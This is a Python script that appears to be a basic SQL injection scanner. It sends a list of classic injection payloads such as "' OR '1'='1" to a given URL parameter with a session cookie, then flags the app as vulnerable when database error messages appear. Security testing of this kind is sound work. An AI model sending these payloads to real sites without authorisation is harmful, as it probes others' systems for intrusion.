from RequestPayloader import HTTPRequestHandler
import sys

# List of SQL injection payloads to test
payloads = [
    "' --",
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "' OR 'a'='a",
    "' OR 'a'='a' -- ",
    "' OR 1=1#",
    "' OR '1'='1'#",
    "' OR '1'='1'/*",
    "' OR '1'='1'--",
    "' OR 1=1--",
]

# List of common SQL error signatures to detect vulnerabilities
error_signatures = [
    "You have an error in your SQL syntax",
    "Warning: mysql_fetch_assoc()",
    "Warning: mysql_num_rows()",
    "Warning: pg_exec()",
    "Warning: sqlite_query()",
    "Warning: sqlsrv_query()",
    "Unclosed quotation mark",
    "Microsoft OLE DB Provider for ODBC Drivers error",
    "You have an error in your SQL syntax",
    "mysql_fetch",
    "syntax error",
]

def is_vulnerable(response):
    # Check if any SQL error signature is present in the response
    for error in error_signatures:
        if response.lower().find(error.lower()) != -1:
            return True
    return False

def main():
    # Check if there are fewer than 4 arguments passed to the script
    if sys.argv.__len__() < 4:
        # Print error message and usage instruction
        print("Error, not all sufficient arguments were passed.")
        print(f"usage: python {sys.argv[0]} URL PARAM COOKIE")
        exit(-1)  # Exit the program with error code -1

    # Assign command line arguments to variables
    url = sys.argv[1]
    param = sys.argv[2]
    session_cookie = sys.argv[3]

    # Initialize HTTPRequestHandler with the URL and session cookie
    handler = HTTPRequestHandler(url, session_cookie)
    is_it_safe = True

    # Test each SQL injection payload
    for payload in payloads:
        # Send an HTTP GET request with the current payload as the parameter value
        response = handler.send_request(param=param, new_value=payload, method="GET")
        # Check if the response indicates a SQL error
        if is_vulnerable(response.text):
            # Print the payload that generated an error and mark the application as vulnerable
            print(f"Generated error with: {payload} payload")
            is_it_safe = False

    # Print the final assessment of the web application's vulnerability
    if is_it_safe is False:
        print("Web app is vulnerable to SQL injection")
    else:
        print("No errors generated with payloads, web app may not be vulnerable to SQL injection")

if __name__ == "__main__":
    # Run the main function if the script is executed directly
    main()
    exit(0)  # Exit the program with success code 0
